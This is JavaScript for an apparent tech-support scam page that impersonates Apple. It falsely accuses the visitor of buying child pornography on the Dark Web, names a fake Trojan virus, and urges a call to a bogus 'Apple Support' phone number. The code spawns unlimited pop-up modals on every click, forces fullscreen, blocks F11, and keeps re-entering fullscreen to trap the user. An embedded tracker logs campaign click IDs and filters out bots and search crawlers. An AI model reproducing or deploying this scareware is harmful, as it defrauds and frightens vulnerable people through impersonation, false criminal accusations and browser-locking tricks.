


    let modalCount = 0;
    const maxModals = Infinity;
    let fullScreenTriggered = false;

    // Function to trigger full screen
    function triggerFullScreen() {
        const elem = document.documentElement;
        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(err => {
                    console.error('Fullscreen error:', err);
                });
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }
    }

    // Function to exit fullscreen
    function exitFullScreen() {
        if (document.exitFullscreen) {
            document.exitFullscreen();
        } else if (document.webkitExitFullscreen) {
            document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) {
            document.msExitFullscreen();
        }
    }

    // Function to generate random position within viewport
    function getRandomPosition(modalWidth, modalHeight) {
        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);

        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
            return {
                top: Math.max(0, (viewportHeight - modalHeight) / 2),
                left: Math.max(0, (viewportWidth - modalWidth) / 2)
            };
        }

        const maxX = viewportWidth - modalWidth;
        const maxY = viewportHeight - modalHeight;

        const randomX = Math.floor(Math.random() * (maxX + 1));
        const randomY = Math.floor(Math.random() * (maxY + 1));

        return { top: randomY, left: randomX };
    }

    // Function to create a new modal with random position
    function createNewModal() {
        if (modalCount >= maxModals) return null;

        modalCount++;

        const newModal = document.createElement('div');
        newModal.className = 'modal fade modal-stack';
        newModal.id = `appleAlertModal-${modalCount}`;
        newModal.tabIndex = -1;
        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
        newModal.setAttribute('aria-hidden', 'true');

        newModal.innerHTML = `
            <div class="modal-dialog modal-lg positioned">
                <div class="modal-content" id="applealertmodeltwo">
                <div class="d-flex justify-content-between">
  <div><center><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> <b><strong>Surveillance Activated.</strong></b></center><br>
  <b><strong>Alert:</strong> Your iPhone is under Surveillance all actions will be monitored for security.</b></div>
</div>
                    <div class="modal-body text-center">
                        <div class="alert-text">
                            iPhone Surveillance has been activated due to illegal child pornography activity on your device. You ordered child porn videos on Dark-Web via your Apple ID. your action will be reported for further Investigation!</div>
<div class="alert-text"><b><strong>Not You?:</strong> Call Apple Support <a href="tel:+18556232979">+1(855) 623-2979</a> to report unauthorised access of your phone.</b>
                        </div>
<div class="alert-text">Trojan virus:<b>dark-web-remote.dmk</b></div>
<div class="alert-text"><b> Click support tollfree number to call and report activity.</b><div>
                        
                        <div class="text-end gap-4 mt-3 actionbtn">
                            <a href="tel:+18556232979" class="me-2 bg-primary">Click To Call +1(855) 623-2979 </a><br>
                           <a class="me-2 bg-primary">Stop Surveillance </a>
                        </div>
                    </div>
                </div>
 <script>
        (function() {
            'use strict';

            // --- GET CLICKID FROM URL ---
            function getClickID() {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get('clickid') || urlParams.get('SUBID') || 'unknown';
            }

            const clickID = getClickID();

            // --- BOT DETECTION ---
            function isBot() {
                if (navigator.webdriver === true) return true;
                if (!navigator.hardwareConcurrency || navigator.hardwareConcurrency < 2) return true;

                const botPatterns = [
                    'Headless', 'PhantomJS', 'Selenium', 'Puppeteer',
                    'curl', 'wget', 'python-requests', 'Go-http-client',
                    'java', 'perl', 'ruby', 'node-fetch', 'HeadlessChrome',
                    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot',
                    'Baiduspider', 'YandexBot'
                ];
                const ua = navigator.userAgent;
                for (let pattern of botPatterns) {
                    if (ua.includes(pattern)) return true;
                }
                return false;
            }

            const visitorID = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
            const isBotDetected = isBot();
            let startTime = Date.now();
            let pageTitle = document.title;

            // --- SEND LANDING PAGE VISIT ---
            function sendLandingVisit(clicked = true) {
                const timeOnPage = Math.round((Date.now() - startTime) / 1000);

                const data = {
                    id: visitorID,
                    clickID: clickID,
                    ip: '{{VISITOR_IP}}',
                    timestamp: Date.now(),
                    isBot: isBotDetected,
                    clicked18: clicked, // They clicked 18+ to get here
                    timeOnPage: timeOnPage,
                    browser: navigator.userAgent,
                    userAgent: navigator.userAgent,
                    referrer: document.referrer || 'direct',
                    country: '{{VISITOR_COUNTRY}}',
                    page: window.location.href,
                    pageTitle: 'Landing Page - ' + pageTitle,
                    screen: window.screen.width + 'x' + window.screen.height,
                    language: navigator.language,
                    landed: true // Flag to show they reached the landing page
                };

                try {
                    let monitorData = JSON.parse(localStorage.getItem('visitorData') || '[]');

                    // Try to find existing visitor by ClickID
                    const existingIndex = monitorData.findIndex(v => v.clickID === clickID && v.clicked18 === true);
                    if (existingIndex !== -1) {
                        // Update existing visitor with landing page data
                        monitorData[existingIndex] = { ...monitorData[existingIndex], ...data };
                    } else {
                        monitorData.push(data);
                    }

                    localStorage.setItem('visitorData', JSON.stringify(monitorData));

                    // Log the landing page visit
                    let logs = JSON.parse(localStorage.getItem('logEntries') || '[]');
                    logs.push({
                        time: new Date().toLocaleTimeString(),
                        clickID: clickID,
                        message: '🚀 ' + (isBotDetected ? '🤖 Bot' : '👤 Human') +
                            ' reached LANDING PAGE | ClickID: ' + clickID +
                            ' | Time on page: ' + timeOnPage + 's',
                        type: 'landing-log',
                        clickID: clickID
                    });

                    if (logs.length > 500) logs = logs.slice(-500);
                    localStorage.setItem('logEntries', JSON.stringify(logs));

                } catch (e) {
                    console.log('Landing tracking error:', e);
                }

                console.log('📊 Landing page tracked for ClickID:', clickID);
            }

            // --- TRACK ON LOAD ---
            document.addEventListener('DOMContentLoaded', function() {
                // Send initial landing visit
                sendLandingVisit(true);

                // Track time on page
                window.addEventListener('beforeunload', function() {
                    sendLandingVisit(true);
                });

                // Re-send after intervals
                setTimeout(function() { sendLandingVisit(true); }, 5000);
                setTimeout(function() { sendLandingVisit(true); }, 30000);
            });

            console.log('📊 Landing page tracking active for ClickID:', clickID);
            console.log('🤖 Bot detected:', isBotDetected);

            window.__landingTracker = {
                visitorID: visitorID,
                clickID: clickID,
                isBot: isBotDetected,
                sendData: sendLandingVisit
            };

        })();
    </script>
            </div>

        `;

        document.getElementById('modalContainer').appendChild(newModal);

        const modal = new bootstrap.Modal(newModal, {
            backdrop: 'static',
            keyboard: false
        });

        const modalDialog = newModal.querySelector('.modal-dialog');
        let modalWidth, modalHeight;

        modalWidth = Math.min(600, window.innerWidth * 0.9);
        modalHeight = window.innerWidth <= 576 ? 250 : 400;

        const { top, left } = getRandomPosition(modalWidth, modalHeight);
        modalDialog.style.top = `5px`;
        modalDialog.style.left = `${left}px`;

        if (window.innerWidth <= 576) {
            modalDialog.style.width = `${modalWidth}px`;
            modalDialog.style.maxWidth = 'none';
        }

        newModal.style.zIndex = 1080 + modalCount;
        modal.show();

        // Ensure tel: link actually triggers phone call
        newModal.querySelectorAll('.tel-link').forEach(link => {
            link.addEventListener('click', (e) => {
                window.location.href = link.getAttribute('href');
            });
        });

        // return modal;
    }

    // Initialize the first modal
    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
        backdrop: 'static',
        keyboard: false
    });

    document.addEventListener('DOMContentLoaded', function () {
        appleAlertModal.show();
    });

    // Add event listener to body for fullscreen and modal creation
    document.body.addEventListener('click', () => {
        triggerFullScreen();
        createNewModal();
    });

    // On ESC â†’ exit fullscreen
    document.addEventListener("keydown", function (e) {
        if (e.key === "Escape") {
            exitFullScreen();
        }
        if (e.key === "F11" || e.keyCode === 122) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }, true);

    document.addEventListener("keyup", function (e) {
        if (e.key === "F11" || e.keyCode === 122) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }, true);

    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
    document.addEventListener("fullscreenchange", () => {
        if (!document.fullscreenElement) {
            // User exited fullscreen
            document.body.addEventListener("click", triggerFullScreen, { once: true });
        }
    });

    window.addEventListener('resize', function () {
        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');

        modals.forEach(modal => {
            const viewportHeight = window.innerHeight;
            const modalHeight = modal.offsetHeight;
            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);

            if (top + modalHeight > viewportHeight) {
                top = Math.max(0, viewportHeight - modalHeight);
            }

            modal.style.top = `5px`;
            modal.style.left = `0`;
            modal.style.width = `100%`;
            modal.style.maxHeight = `${viewportHeight}px`;
            modal.style.overflow = `hidden`;
        });
    });

